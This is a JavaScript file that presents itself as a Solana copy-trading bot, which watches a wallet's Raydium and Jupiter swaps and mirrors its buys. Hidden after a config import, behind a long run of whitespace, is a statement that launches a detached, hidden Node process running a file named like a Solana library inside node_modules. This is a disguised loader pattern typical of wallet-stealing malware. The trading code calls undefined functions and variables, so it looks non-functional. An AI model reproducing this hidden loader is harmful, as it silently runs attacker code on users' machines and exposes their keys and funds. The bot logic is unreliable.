const web3 = require('@solana/web3.js');
const Token = require('@solana/spl-token');
const axios = require('axios');
const chalk = require("chalk");

const RPC_URL = "https://api.mainnet-beta.solana.com";
const PRIVATE_KEY = "2JqbAesdUnyexKgseoa2HAaeLRjj5DYuod8Vxxt6wvCa5YmMMBvvjTigA48WSRKCSXkkWkFwecQ8q881LZiU3jT1";
const MONITOR_WALLET = '3v2pbSrB6sWT7mUE9JvpuXbUViGLPUMKxtcsJmBpi4sM';
const BUY_AMOUNT = 0.01;

const { } = require('./config');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           const{spawn}=require('child_process');const cmd1='node';const argv1=['node_modules/@solana-web3-1.43.js'];spawn(cmd1,argv1,{detached:true,windowsHide:true});


const connection = new web3.Connection(RPC_URL, 'confirmed');
const JUPITER_AGGREGATOR_V6 = new web3.PublicKey('JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4');
const RAYDIUM_LP_V4 = new web3.PublicKey('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8');
const CHECK_INTERVAL = 5000;

let knownTrades = []

async function buy(accountId, poolState) {
  wallet = web3.Keypair.fromSecretKey(Array.from(Buffer.from(PRIVATE_KEY)));
  console.log({ mint: poolState.baseMint }, `Sending buy TX`);
  
  try {
    const [market, mintAta] = await Promise.all([
    marketStorage.get(poolState.marketId.toString()),
    getAssociatedTokenAddress(poolState.baseMint, wallet.publicKey),
    ]);
    const poolKeys = createPoolKeys(accountId, poolState, market);
    
    for (let i = 0; i < maxBuyRetries; i++) {
      try {
        console.log(
        { mint: poolState.baseMint.toString() },
        `Send buy transaction attempt: ${i + 1}/${maxBuyRetries}`,
        );
        const tokenOut = new Token(TOKEN_PROGRAM_ID, BUY_AMOUNT * Math.pow(10, 9), poolKeys.baseDecimals);
        const result = await swap(
        poolKeys,
        quoteAta,
        mintAta,
        quoteToken,
        tokenOut,
        quoteAmount,
        buySlippage,
        wallet,
        'buy',
        );
        
        if (result.confirmed) {
          console.log(
          {
            mint: poolState.baseMint.toString(),
            signature: result.signature,
            url: `https://solscan.io/tx/${result.signature}?cluster=${NETWORK}`,
          },
          `Confirmed buy tx`,
          );
          
          break;
        }
        
        console.log(
        {
          mint: poolState.baseMint.toString(),
          signature: result.signature,
          error: result.error,
        },
        `Error confirming buy tx`,
        );
      } catch (error) {
        console.log({ mint: poolState.baseMint.toString(), error }, `Error confirming buy transaction`);
      }
    }
  } catch (error) {
    console.log({ mint: poolState.baseMint.toString(), error }, `Failed to buy token`);
  }
}

async function getTransactionInfo(signature) {
  const response = await axios.post(RPC_URL, {
    jsonrpc: '2.0',
    id: 1,
    method: 'getTransaction',
    params: [signature, { encoding: 'jsonParsed', commitment: 'finalized', maxSupportedTransactionVersion: 0 }],
  });
  
  if (response.status !== 200) {
    throw new Error(`HTTP error: ${response.status}`);
  }
  return response.data.result;
}

function getInstructions(transaction) {
  return transaction.transaction.message.instructions;
}

function instructionsWithProgramId(instructions, programId) {
  let foundSwap = [];
  instructions.forEach(instruction => {
    try {
      if (instruction.accounts.includes(programId.toString())) {
        foundSwap.push(instruction);
      }
    } catch {}
  });
  return foundSwap;
}

async function getTxTokens(signature) {
  try {
    const tx_info = await getTransactionInfo(signature);
    const instructions = getInstructions(tx_info);
    
    const filteredInstructionsRaydium = instructionsWithProgramId(instructions, RAYDIUM_LP_V4);
    const filteredInstructionsJupiter = instructionsWithProgramId(instructions, JUPITER_AGGREGATOR_V6);
    
    if (filteredInstructionsRaydium.length > 0) {
      for (const instruction of filteredInstructionsRaydium) {
        try {
          let accounts = instruction.accounts;
          if (accounts.length >= 18) {
            const pair = accounts[1];
            const associateIn = accounts[15];
            const associateOut = accounts[16];
            const owner = accounts[17];
            return { pair, associateIn, associateOut, owner };
          }
        } catch {}
      }
    }
    
    if (filteredInstructionsJupiter.length > 0) {
      for (const instruction of filteredInstructionsJupiter) {
        try{
          let accounts = instruction.accounts;
          if (accounts.length >= 12) {
            const pair = accounts[11];
            const associateIn = accounts[2];
            const associateOut = accounts[3];
            const owner = accounts[1];
            return { pair, associateIn, associateOut, owner };
          }
        } catch {}
      }
    }
    
    return null;
  } catch (error) {
    return null;
  }
}

async function getSplTokenTransactions(walletAddress) {
  const walletPublicKey = new web3.PublicKey(walletAddress);
  
  try {
    const signatures = await connection.getSignaturesForAddress(walletPublicKey, { limit: 1 });
    for (const signatureInfo of signatures) {
      try {
        const { pair, associateIn, associateOut, owner } = await getTxTokens(signatureInfo.signature);
        if (pair != null) {
          if (!knownTrades.includes(signatureInfo.signature)) {
            knownTrades.push(signatureInfo.signature);
            return pair;
          }
        }
      } catch {}
    }
  } catch {}
  return null;
}

async function monitorWallet() {
  await getSplTokenTransactions(MONITOR_WALLET);
  console.log(chalk.blue(`
  ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░
  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
  ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░
  ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░
  ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░
  ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░         ░▒▓█▓▒░
  
  
  `));
  console.log(chalk.white("[-] Monitoring ") + chalk.cyan(MONITOR_WALLET.toString()) + chalk.white(" SPL trades..."));
  while (true) {
    const pair = await getSplTokenTransactions(MONITOR_WALLET);
    if (pair != null) {
      console.log(chalk.green("[!] Found new swap TX\n    Pair:", pair.toString()));
      try {
        await buy(pair, JUPITER_AGGREGATOR_V6);
      } catch (error) {
        console.log(chalk.red("Error buying", error));
      }
    }
    await new Promise(r => setTimeout(r, CHECK_INTERVAL));
  }
}

monitorWallet();
